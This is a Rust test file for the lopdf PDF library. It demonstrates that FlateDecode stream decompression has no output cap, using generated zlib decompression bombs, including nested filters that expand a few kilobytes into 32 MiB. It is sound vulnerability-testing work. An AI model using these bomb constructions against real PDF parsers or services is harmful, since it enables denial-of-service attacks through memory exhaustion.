//! Tests demonstrating that PDF stream decompression is unbounded.
//!
//! `Stream::decompressed_content` inflates `FlateDecode` data into an unbounded
//! `Vec`, so a small compressed stream can expand to an arbitrarily large
//! output (a decompression bomb). Nested filters multiply the amplification.
//!
//! Bombs are built by streaming zeros through the compressor, so the test
//! process itself never allocates the full (large) plaintext.

use flate2::write::ZlibEncoder;
use flate2::Compression;
use std::io::Write;

use lopdf::{Dictionary, Object, Stream};

const MIB: usize = 1024 * 1024;

/// A zlib stream that decodes to `target` zero-bytes, built without ever holding
/// `target` bytes in memory at once.
fn flate_bomb(target: usize) -> Vec<u8> {
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
    let zeros = [0u8; 64 * 1024];
    let mut remaining = target;
    while remaining > 0 {
        let n = remaining.min(zeros.len());
        encoder.write_all(&zeros[..n]).unwrap();
        remaining -= n;
    }
    encoder.finish().unwrap()
}

/// Compress arbitrary bytes with zlib (always emits a valid stream).
fn zlib_compress(data: &[u8]) -> Vec<u8> {
    let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(data).unwrap();
    encoder.finish().unwrap()
}

/// A single `FlateDecode` stream inflates ~32 KiB of input to 32 MiB of output
/// (~1000x) with no cap — the library materializes the whole thing.
#[test]
fn single_filter_bomb_expands_without_limit() {
    let mut dict = Dictionary::new();
    dict.set("Filter", "FlateDecode");
    let bomb = Stream::new(dict, flate_bomb(32 * MIB));

    assert!(
        bomb.content.len() < 128 * 1024,
        "input should be tiny: {} bytes",
        bomb.content.len()
    );

    let output = bomb.decompressed_content().expect("decodes");
    assert_eq!(output.len(), 32 * MIB, "the full output was materialized with no cap");
}

/// Chained filters multiply the amplification: under 8 KiB of input expands to
/// 32 MiB through `[FlateDecode FlateDecode]`. Additional layers reach petabyte
/// scale — an instant out-of-memory kill.
#[test]
fn chained_filter_bomb_expands_without_limit() {
    let inner = flate_bomb(32 * MIB); // layer 2 decodes this -> 32 MiB
    let outer = zlib_compress(&inner); // layer 1 decodes to `inner` (tiny)

    let mut dict = Dictionary::new();
    dict.set("Filter", vec![Object::from("FlateDecode"), Object::from("FlateDecode")]);
    let stream = Stream::new(dict, outer);

    assert!(
        stream.content.len() < 8 * 1024,
        "input should be under 8 KiB: {} bytes",
        stream.content.len()
    );

    let output = stream.decompressed_content().expect("decodes");
    assert_eq!(output.len(), 32 * MIB, "nested filters expanded fully, no cap");
}
